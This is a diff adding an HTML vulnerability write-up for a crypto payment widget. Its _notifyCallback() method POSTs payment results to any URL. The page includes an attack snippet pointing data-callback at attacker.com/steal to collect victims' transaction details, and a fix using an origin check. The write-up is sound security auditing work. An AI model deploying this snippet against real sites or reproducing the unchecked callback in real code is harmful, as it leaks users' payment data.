@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>CSRF via callback URL</title></head>
+<body style="background:#0a0a0f;color:#e2e2f0;font-family:monospace;padding:2rem">
+<h1 style="color:#f97316">Vulnerability #4: CSRF via callback URL</h1>
+
+<p>The <code>_notifyCallback()</code> method POSTs payment result to any URL
+without checking the origin of the request. An attacker can:</p>
+
+<pre style="background:#12121e;padding:1rem;border-radius:4px;color:#c9a227">
+// VULNERABLE CODE (current widget):
+async _notifyCallback(callbackUrl, result) {
+  await fetch(callbackUrl, {   // ← no origin check!
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(result)
+  });
+}
+</pre>
+
+<p>Attack: Attacker controls <code>data-callback</code> on their site:</p>
+
+<pre style="background:#12121e;padding:1rem;border-radius:4px;color:#c9a227">
+&lt;div id="rtc-pay"
+     data-callback="https://attacker.com/steal"
+     data-to="C4c7r9WPsnEe6CUfegMU9M7ReHD1pWg8qeSfTBoRcLbg"
+     data-amount="1"&gt;
+&lt;/div&gt;
+</pre>
+
+<p>Result: After a successful payment, the victim's payment receipt
+(tx hash, amount, from/to address) is POSTed to the attacker's server.</p>
+
+<p>Fix: Verify <code>callbackUrl.origin === window.location.origin</code>
+before sending data.</p>
+</body>
+</html>
